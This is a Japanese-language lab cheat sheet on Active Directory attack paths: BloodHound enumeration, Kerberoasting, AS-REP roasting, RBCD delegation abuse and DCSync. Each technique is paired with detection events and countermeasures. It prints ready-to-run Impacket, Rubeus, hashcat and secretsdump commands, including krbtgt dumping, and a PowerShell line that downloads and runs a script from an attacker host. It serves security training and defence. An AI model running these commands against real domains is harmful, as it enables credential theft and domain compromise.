Active Directory

ドメイン参加ホスト上の低権限から、列挙 → Kerberos 悪用 → 権限委任 → ドメイン支配へ至る経路。すべてラボ想定・プレースホルダ。攻撃の要点と防御側の検知/対策を併記する。 前提: 有効なドメイン資格情報を1組保持している状態から開始。

01列挙Enumeration

攻撃経路は関係グラフの中にある。まず BloodHound で収集し、Kerberoast 可能なアカウント、危険な ACL、委任設定、到達可能な高権限へのパスを可視化する。

BloodHound 収集(リモート)

bash
# Python collector — ドメイン参加ホスト不要
bloodhound-python -u '<USER>' -p '<PASS>' \
  -d <DOMAIN.LOCAL> -ns <DC_IP> -c All --zip
powershell
# ホスト上から SharpHound（インメモリ実行）
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp

手早い当たり(NetExec)

bash
# 資格情報の有効性・管理者範囲・パスワードポリシー
nxc smb <TARGETS> -u '<USER>' -p '<PASS>'
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol --users --groups
防御 / countermeasures
  • 大量の LDAP/SAMR クエリ(短時間の全ユーザ・全グループ列挙)を Event ID 1644 や SACL で検知。
  • SharpHound の特徴的な SMB/LDAP バーストと、無署名の一斉接続を EDR/ネットワークで監視。

02KerberoastingSPN 付きアカウント

SPN が設定されたサービスアカウントの TGS は、そのアカウントの NT ハッシュで暗号化される。任意のドメインユーザが要求でき、オフラインでクラック可能。弱いパスワードのサービスアカウントが本丸。

bash
# Impacket — impacket は venv 優先
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' \
  -dc-ip <DC_IP> -request -outputfile roast.hash
powershell
# ホスト上から Rubeus
.\Rubeus.exe kerberoast /nowrap /outfile:roast.hash
bash
# オフラインクラック（etype 23 = RC4）
hashcat -m 13100 roast.hash /usr/share/wordlists/rockyou.txt
注意AES 限定(etype 17/18)のアカウントは -m 19700/19600。RC4 を要求できる場合は「Kerberoast の格下げ」に該当し、それ自体が検知シグナルになる。
防御 / countermeasures
  • サービスアカウントは gMSA/長大ランダムパスワードにし、Kerberoast の前提(クラック可能性)を消す。
  • Event ID 4769 で RC4(0x17)の TGS 要求を監視。単一ユーザからの多数 SPN 要求を相関。
  • 不要な SPN の棚卸し。特権グループ所属のサービスアカウントを排除。

03AS-REP Roasting事前認証なし

DONT_REQ_PREAUTH が立つアカウントは、事前認証なしで AS-REP を取得でき、そのユーザのハッシュで暗号化された部分をオフラインクラックできる。資格情報不要で列挙できる点が特徴。

bash
# ユーザ名リストから（認証不要）
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> \
  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
防御 / countermeasures
  • "Kerberos 事前認証を要求しない" フラグを全アカウントで解除(互換目的の残存を棚卸し)。
  • Event ID 4768 で事前認証なしの AS-REQ を監視。

04権限委任Delegation

委任の誤設定はドメイン支配への近道になりやすい。種別ごとに前提と獲得物が異なる。

種別誤設定獲得
Unconstrained委任対象が無制限接続してきたユーザの TGT を収集
Constrained特定 SPN への委任 + プロトコル遷移任意ユーザとして対象サービスへ
RBCD対象の msDS-AllowedToActOnBehalfOfOtherIdentity を書換可対象ホストへ任意ユーザとして

RBCD(書込 ACL がある場合)

bash
# 制御下のマシンアカウントを RBCD 委任先に設定
rbcd.py -delegate-from '<FAKE$>' \
  -delegate-to '<TARGET$>' -action write \
  <DOMAIN>/<USER>:'<PASS>'

# S4U で対象ホストの管理者チケットを取得
getST.py -spn cifs/<TARGET.FQDN> \
  -impersonate Administrator -dc-ip <DC_IP> \
  <DOMAIN>/'<FAKE$>':'<MACHINE_PASS>'
tipsマシンアカウント作成は既定で MachineAccountQuota=10 に依存。0 の環境では既存の制御アカウントを流用する。
防御 / countermeasures
  • 特権アカウントを "機密であり委任できない" に設定、Protected Users グループを活用。
  • Unconstrained 委任を DC 以外から排除。MachineAccountQuota=0 を既定に。
  • msDS-AllowedToActOnBehalfOfOtherIdentity の変更(Event 5136)を監視。

05DCSync / ダンプ資格情報の一括奪取

DS-Replication 権限(Replicating Directory Changes All)を持つと、DC のレプリケーションを装って任意アカウントのハッシュを取得できる。ドメイン管理者相当の到達後、または委譲された ACL がある場合に成立。

bash
# 特定ユーザのみ
secretsdump.py <DOMAIN>/'<ADMIN>':'<PASS>'@<DC_IP> \
  -just-dc-user krbtgt

# ドメイン全体（NTDS）
secretsdump.py <DOMAIN>/'<ADMIN>':'<PASS>'@<DC_IP> -just-dc
運用krbtgt ハッシュはゴールデンチケットの素になる。ラボ検証以外での取得・保持は影響が大きい。公開ノートには当然ハッシュ値は載せない。
防御 / countermeasures
  • DC 以外からの DS-Replication 要求を Event ID 4662(レプリケーション GUID)で検知。
  • Tier 0 の分離、krbtgt の定期二回ローテーション、特権 ACL の監査。
要点 / key takeaways
  • まずグラフ化(BloodHound)。単発コマンドより「到達可能な最短パス」を先に把握する。
  • Kerberos 系(Kerberoast / AS-REP)は弱いパスワード前提。gMSA と長大パスワードで前提を崩せる。
  • 委任の誤設定は横展開より速くドメイン支配に化ける。ACL 書込権限の有無が分岐点。
  • 各手法に 4769 / 4768 / 4662 など固有の監査イベントがある。攻撃の裏返しがそのまま検知になる。
